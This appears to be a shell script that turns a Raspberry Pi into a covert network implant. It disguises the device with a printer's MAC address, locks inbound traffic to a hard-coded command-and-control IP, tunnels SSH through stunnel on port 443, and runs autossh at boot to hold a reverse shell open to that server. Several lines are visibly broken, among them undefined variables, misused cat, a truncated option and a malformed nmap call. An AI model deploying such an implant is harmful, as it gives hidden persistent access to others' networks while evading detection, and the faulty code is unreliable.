#! /bin/sh
# PI REVERSE SSH TUNNEL
	CNCIPADDRESS=35.186.169.125
# INSTALL ANY UPDATES &
	apt-get update -y && apt-get upgrade -y && apt autoremove
# INSTALL PRE-REQ APPS
	apt install bash-completion openssh-server autossh iptables-persistent stunnel4 -y

# CHANGE DEFAULT MAC ADDRESS (TO A CANON MAC)
	printf 'pre-up ifconfig wlan0 hw ether 00:1E:8F:26:00:A1' > /etc/network/interfaces

# IPTABLES: DENY ALL INBOUND ACCESS *EXCEPT* FROM THE IP ADDRESS STATED
	iptables -P FORWARD DROP 
	iptables -A INPUT -m state --state INVALID -j DROP 
	iptables -A INPUT -m state --state RELATED ESTABLISHED -j ACCEPT 
	iptables -A INPUT -i lo -j ACCEPT 
	iptables -A INPUT -s $CNCIPADDRESS -j ACCEPT
	iptables -P INPUT DROP 
	iptables-save > /etc/iptables/rules.v4

# SET IPTABLES TO GO AT STARTUP
# AND MAKE EXECUTABLE
	printf '#! /bin/sh\n/sbin/iptables-restore < /etc/iptables/rules.v4' > /etc/network/if-up.d/iptables
	chmod +x /etc/network/if-up.d/iptables

# SETUP STUNNELS.CONF 
	printf "pid = /var/run/stunnel.pid\nclient=yes\n[ssh]\naccept = 443\nconnect = $CNCIPADDRESS:443" > /etc/stunnel/stunnel.conf

#STUNNEL AUTO STARTUP - default is ENABLED=0 
	printf 'ENABLED=1' > /etc/default/stunnel4



###### CONFIGURING C&C SERVER 
####
###
# GENERATE A KEY-PAIR TO BE USED TO ENCRYPT/DECRYPT THE SSL TRAFFIC 
	openssl genrsa 2048 > /etc/stunnel/stunnelpi.key 
	openssl req -new -key /etc/stunnel/stunnelpi.key -x509 -days 365 -out /etc/stunnel/stunnelpi.crt 
	cat /etc/stunnel/stunnelpi.crt /etc/stunnel/stunnelpi.key > /etc/stunnel/stunnelpi.pem

#STUNNEL SET TO ACCEPT CONNS ON P443 AND REDIRECT TO 22
	TEXT5="pid = /var/run/stunnel.pid \
		cert = /etc/stunnel/stunnelpi.pem \
		[ssh] \
		accept = 443 \
		connect = 127.0.0.1:22"
	cat $TEXT5 >> /etc/stunnel/stunnel.conf

#STUNNEL AUTO STARTUP
	cat $TEXT4 >> /etc/default/stunnel4
	
# SET AUTOSSH TO LAUNCH AS SOON AS NETWORK UP.	
	touch /etc/network/if-up.d/autossh 
	chmod +x /etc/network/if-up.d/autossh 
	TEXT6="#!/bin/sh \
	su -c \"autossh -p 443 -f -N -R *:2222:localhost:22 [email protected] -o LogLevel=error -o UserKnownHostsFile=/dev/null -o\""
	cat $TEXT6 >> /etc/network/if-up.d/autossh

# -p 443 	establish the SSH tunnel on port 443 which is our stunnel SSL-tunnel. the request to 443 will be forwarded to localhost:22. 
# -f 		requests ssh to go to background mode 
# -N 		dont Execute a remote command – useful for forwarding ports 
# -R 		here we’re saying that anything that connects to port 2222 on the other side of tunnel (server) will actually reach localhost (Pi – client) on port 22.

	
	
	
# TO CONNECT TO PI FROM C&C SERVER...
# -----------    ssh -vp.................. 2222 root@localhost

# TROUBLESHOOTING...
## CHECK THAT THE CNC SERVER HAS PORT OPEN (443 IN THIS CASE)
# nmap -443 $CNCIPADDRESS